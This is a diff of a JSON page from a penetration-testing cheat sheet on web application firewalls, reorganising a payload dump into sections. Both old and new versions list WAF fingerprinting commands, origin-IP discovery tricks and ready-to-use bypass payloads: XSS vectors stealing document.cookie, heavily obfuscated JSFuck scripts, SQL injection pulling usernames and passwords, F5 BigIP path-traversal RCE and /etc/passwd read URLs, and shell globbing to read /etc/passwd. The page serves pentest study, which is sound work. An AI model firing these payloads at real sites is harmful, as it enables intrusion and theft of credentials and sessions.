@@ -1,5 +1,5 @@
 {
-    "title": "WAFs",
+    "title": "Web Application Firewalls (WAFs)",
     "breadcrumb": [
         {
             "title": "Enumeration",
@@ -12,43 +12,111 @@
     ],
     "sections": [
         {
-            "heading": "Tools",
-            "type": "paragraph",
-            "content": "``\nwhatwaf https://example.com\nwafw00f https://example.com\n# https://github.com/vincentcox/bypass-firewalls-by-DNS-history\nbash bypass-firewalls-by-DNS-history.sh -d example.com\n# Bypasser\n# https://github.com/RedSection/pFuzz\n# https://github.com/nemesida-waf/waf-bypass\n# Domain IP history\nhttps://viewdns.info/iphistory/\n# Bypasses and info\nhttps://github.com/0xInfection/Awesome-WAF\nhttps://github.com/waf-bypass-maker/waf-community-bypasses\n`\n`\n# Manual identification\ndig +short target.com\ncurl -s https://ipinfo.io/ | jq -r '.com'\n# Always check DNS History for original IP leak\nhttps://whoisrequest.com/history/\n# Waf detection\nnmap --script=http-waf-fingerprint victim.com\nnmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 victim.com\nnmap -p80 --script http-waf-detect --script-args=\"http-waf-detect.aggro \" victim.com\nwafw00f victim.com\n# Good bypass payload:\n%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)\njavascript:”/’// →\n# Bypass trying to access to :\ndev.domain.com\nstage.domain.com\nww1/ww2/ww3...domain.com\nwww.domain.uk/jp/\n# Akamai\norigin.sub.domain.com\norigin-sub.domain.com\n- Send header:\nPragma: akamai-x-get-true-cache-key\n{{constructor.constructor(alert1)()}}\n\\');confirm(1);//\n444//OR//MID(CURRENTUSER,1,1)//LIKE//\"p\"//#\n# ModSecurity Bypass\n\n# Cloudflare\npython3 cloudflair.py domain.com\n# https://github.com/mandatoryprogrammer/cloudflareenum\ncloudflareenum.py disney.com\nhttps://viewdns.info/iphistory/?domain=domain.com\nhttps://whoisrequest.com/history/\n# Cloudflare bypasses\nalert(1)\nX\n\ny='a@b'//a@b%0a\\u0061lert(1)\n\n# Aqtronix WebKnight WAF\n- SQLi\n0 union(select 1,@@hostname,@@datadir)\n0 union(select 1,username,password from(users))\n- XSS\n\nRight-Click Here\n# ModSecurity\n- XSS\nalert(document.cookie)\nonmouseover%0B=\nontoggle%0B%3D\n\n- SQLi\n1+uni%0Bon+se%0Blect+1,2,3\n# Imperva Incapsula\nhttps://medium.com/@0xpegg/imperva-waf-bypass-96360189c3c5\nurl.com/search?search=%3E%3C/span%3E%3Cp%20onmouseover=%27p%3D%7E%5B%5D%3Bp%3D%7B%5F%5F%5F%3A%2B%2Bp%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%5F%24%3A%2B%2Bp%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5Bp%5D%2C%5F%24%5F%3A%2B%2Bp%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%24%3A%28p%5Bp%5D%2B%22%22%29%5Bp%5D%2C%5F%24%24%3A%2B%2Bp%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5Bp%5D%2C%24%5F%5F%3A%2B%2Bp%2C%24%5F%24%3A%2B%2Bp%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5Bp%5D%2C%24%24%5F%3A%2B%2Bp%2C%24%24%24%3A%2B%2Bp%2C%24%5F%5F%5F%3A%2B%2Bp%2C%24%5F%5F%24%3A%2B%2Bp%7D%3Bp%2E%24%5F%3D%28p%2E%24%5F%3Dp%2B%22%22%29%5Bp%2E%24%5F%24%5D%2B%28p%2E%5F%24%3Dp%2E%24%5F%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%24%24%3D%28p%2E%24%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28%28%21p%29%2B%22%22%29%5Bp%2E%5F%24%24%5D%2B%28p%2E%5F%5F%3Dp%2E%24%5F%5Bp%2E%24%24%5F%5D%29%2B%28p%2E%24%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%5F%24%5D%29%2B%28p%2E%5F%3D%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%5F%5D%29%2Bp%2E%24%5F%5Bp%2E%24%5F%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%24%2Bp%2E%24%3Bp%2E%24%24%3Dp%2E%24%2B%28%21%22%22%2B%22%22%29%5Bp%2E%5F%24%24%5D%2Bp%2E%5F%5F%2Bp%2E%5F%2Bp%2E%24%2Bp%2E%24%24%3Bp%2E%24%3D%28p%2E%5F%5F%5F%29%5Bp%2E%24%5F%5D%5Bp%2E%24%5F%5D%3Bp%2E%24%28p%2E%24%28p%2E%24%24%2B%22%5C%22%22%2Bp%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%24%24%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2Bp%2E%5F%5F%2B%22%28%5C%5C%5C%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%5F%2Bp%2E%24%24%24%5F%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2B%28%21%5B%5D%2B%22%22%29%5Bp%2E%5F%24%5F%5D%2Bp%2E%5F%24%2B%22%2C%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%24%24%5F%2Bp%2E%24%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%5F%24%5F%2Bp%2E%5F%24%24%2Bp%2E%24%24%5F%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%24%5F%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%5F%24%2Bp%2E%5F%5F%24%2B%22%5C%5C%22%2Bp%2E%5F%5F%24%2Bp%2E%24%24%5F%2Bp%2E%5F%5F%5F%2Bp%2E%5F%5F%2B%22%5C%5C%5C%22%5C%5C%22%2Bp%2E%24%5F%5F%2Bp%2E%5F%5F%5F%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3B%27%3E\n\n- Parameter pollution SQLi\nhttp://www.website.com/page.asp?a=nothing'/&a=/or/&a=/1=1/&a=/--+-\nhttp://www.website.com/page.asp?a=nothing'/&a%00=/or/&a=/1=1/&a%00=/--+-\n-XSS\n%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E\n\n# FAIL2BAN SQLi\n(SELECT 6037 FROM(SELECT COUNT(),CONCAT(0x7176706b71,(SELECT (ELT(6037=6037,1))),0x717a717671,FLOOR(RAND(0)2))x FROM INFORMATIONSCHEMA.PLUGINS GROUP BY x)a)\n# F5 BigIP\nRCE: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'\nRead File: curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'\n- XSS\n\nRight-Click Here\n\nRight-Click Here\n(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[]\n)[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[\n+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![\n]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[\n]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]\n\nRight-Click Here\n# More payloads\nhttps://github.com/Walidhossain010/WAF-bypass-xss-payloads\n# Wordfence\n>\"\n>>\n# RCE WAF globbing bypass\n/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/???/p?s?w?\ncat /etc$u/ps*wd$u\n``\n)\n)"
+            "type": "hint",
+            "variant": "info",
+            "content": "A Web Application Firewall (WAF) filters, monitors, and blocks HTTP traffic to and from a web application. Identifying and bypassing a WAF is a critical step in web penetration testing to ensure payloads reach the backend application."
+        },
+        {
+            "heading": "Identification & Tools",
+            "type": "code_block",
+            "content": [
+                "# --- Automated Detection ---",
+                "wafw00f https://example.com          # Most popular tool",
+                "whatwaf https://example.com          # Advanced fingerprinting",
+                "nmap --script=http-waf-fingerprint victim.com",
+                "nmap -p80 --script http-waf-detect --script-args=\"http-waf-detect.aggro\" victim.com",
+                "",
+                "# --- Manual Identification ---",
+                "dig +short target.com",
+                "curl -I https://target.com            # Look for headers like 'Server: cloudflare' or 'X-CDN'",
+                "curl -s https://ipinfo.io/<ip_address> | jq -r '.org'  # Check IP owner"
+            ]
+        },
+        {
+            "heading": "General Bypass Techniques",
+            "type": "code_block",
+            "content": [
+                "# --- DNS History (Finding the Origin IP) ---",
+                "# If the WAF is a proxy (Cloudflare, Akamai), finding the origin IP bypasses it entirely.",
+                "https://viewdns.info/iphistory/",
+                "https://whoisrequest.com/history/",
+                "bash bypass-firewalls-by-DNS-history.sh -d example.com",
+                "",
+                "# --- Origin IP Scanning ---",
+                "python3 cloudflair.py domain.com      # Find origin IPv4 via Censys",
+                "",
+                "# --- Subdomain Hunting ---",
+                "# Sometimes subdomains point directly to the origin.",
+                "dev.domain.com, stage.domain.com, origin.domain.com",
+                "ww1.domain.com, ww2.domain.com"
+            ]
+        },
+        {
+            "heading": "Specific WAF Bypasses",
+            "type": "code_block",
+            "content": [
+                "# --- Cloudflare ---",
+                "<!<script>alert(1)</script>          # Tag mismatch",
+                "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert(1)\">X</a>",
+                "<img%20id=&#x101;%20src=x%20onerror=&#x101;;alert'1';>",
+                "",
+                "# --- Akamai ---",
+                "Header: Pragma: akamai-x-get-true-cache-key",
+                "{{constructor.constructor(alert`1`)()}}",
+                "",
+                "# --- ModSecurity ---",
+                "<scr%00ipt>alert(document.cookie)</scr%00ipt> # Null byte injection",
+                "onmouseover%0B=                      # Vertical tab",
+                "1+uni%0Bon+se%0Blect+1,2,3            # SQLi bypass",
+                "",
+                "# --- F5 BigIP ---",
+                "RCE: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin",
+                "File Read: /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+                "",
+                "# --- RCE Globbing Bypass ---",
+                "/???/???/c?t$IFS/???/p?s?w?          # Equivalent to /usr/bin/cat /etc/passwd",
+                "cat /etc$u/p*s*wd$u"
+            ]
+        },
+        {
+            "heading": "Payload Collections",
+            "type": "links",
+            "links": [
+                {
+                    "title": "Awesome-WAF - Bypasses and Resources",
+                    "url": "https://github.com/0xInfection/Awesome-WAF"
+                },
+                {
+                    "title": "WAF Community Bypasses",
+                    "url": "https://github.com/waf-bypass-maker/waf-community-bypasses"
+                },
+                {
+                    "title": "XSS WAF Bypass Payloads",
+                    "url": "https://github.com/Walidhossain010/WAF-bypass-xss-payloads"
+                },
+                {
+                    "title": "WAF-Bypass.com - Interactive Guide",
+                    "url": "https://waf-bypass.com"
+                }
+            ]
         }
     ],
     "images": [
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2023-02-27T15:48:17.394Z",
+        "last_updated": "2026-04-22T18:15:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/wafs.md",
         "previous_page": {
             "title": "GitLab",
             "url": "/enumeration/webservices/gitlab"
         },
         "next_page": {
-            "title": "Firebird",
-            "url": "/enumeration/webservices/firebird"
+            "title": "SAML",
+            "url": "/enumeration/webservices/saml"
         }
     }
 }
